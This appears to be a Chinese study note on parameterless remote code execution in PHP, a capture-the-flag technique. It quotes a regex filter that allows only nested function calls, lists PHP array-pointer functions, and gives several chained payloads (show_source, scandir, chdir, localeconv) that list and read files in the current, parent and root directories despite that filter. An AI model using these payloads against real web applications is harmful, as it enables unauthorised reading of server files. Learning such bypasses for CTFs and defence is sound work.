无参RCE

 //无参REC的标志之一

preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {

[无参数RCE绕过的详细总结（六种方法）_无参数的取反rce-CSDN博客](https://blog.csdn.net/2301_76690905/article/details/133808536)

简而言之，无参数rce就是不使用参数，而只使用一个个函数最终达到目的。



[无参数RCE绕过的详细总结（六种方法）_无参数的取反rce-CSDN博客](https://blog.csdn.net/2301_76690905/article/details/133808536)

```
end() ： 将内部指针指向数组中的最后一个元素，并输出
next() ：将内部指针指向数组中的下一个元素，并输出
prev() ：将内部指针指向数组中的上一个元素，并输出
reset() ： 将内部指针指向数组中的第一个元素，并输出
each() ： 返回当前元素的键名和键值，并将内部指针向前移动

highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件
print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件
print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位
  //查看和读取根目录文件
  //查看和读取根目录文件
```

